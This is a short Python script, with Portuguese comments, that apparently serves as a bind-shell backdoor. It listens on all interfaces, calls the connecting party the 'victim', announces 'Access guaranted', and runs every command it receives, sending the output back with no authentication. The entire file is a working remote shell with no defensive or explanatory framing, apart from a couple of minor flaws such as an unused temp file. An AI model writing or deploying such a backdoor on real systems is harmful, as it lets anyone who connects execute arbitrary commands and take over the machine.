import socket
import os
import sys
import subprocess



def receive_message(sock):
    # A mensagem recebida deve sempre ter um comprimento fixo de 80 caracteres
    message = sock.recv(80)
    message = message.decode()
    
    # Remover espaço do inicio e fim do string
    message = message.strip()
    
    return message
            
def send_message(sock, message):
    # A mensagem  a ser enviada deve ter sempre um comprimento igual a 80

    # Se o comprimento do output for menor do que 80 temos de fazer 
    # padding no commando antes de enviar
    if len(message) < 80:
        message = message + " " * (80- len(message) )

    sock.send(message.encode())


def run_command(command):
    try:
        result = subprocess.run(command.split(" "), capture_output=True)
        command_output = result.stdout.decode()

    except FileNotFoundError:
        command_output = "Error!: command/file not found"
    
    return command_output

 

def repl(sock):
    with open('tmp', 'w+') as stdout:
        while True:
            message = ""
            message = receive_message(sock)

            if len(message) <= 0 or message == "":
                break
            if message == "exit":
                break

            command_output = run_command(message)

            send_message(sock, command_output)

         


def main():
    port = input("Insira a porta: ")

    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    address = ("0.0.0.0", int(port))
    sock.bind(address)
    sock.listen(1)
    print("Listening for connection on port:"+ str(port))

    conn , ipvictim = sock.accept()
    msg = "Access guaranted"
    conn.send(msg.encode())

    repl(conn)
    

main()
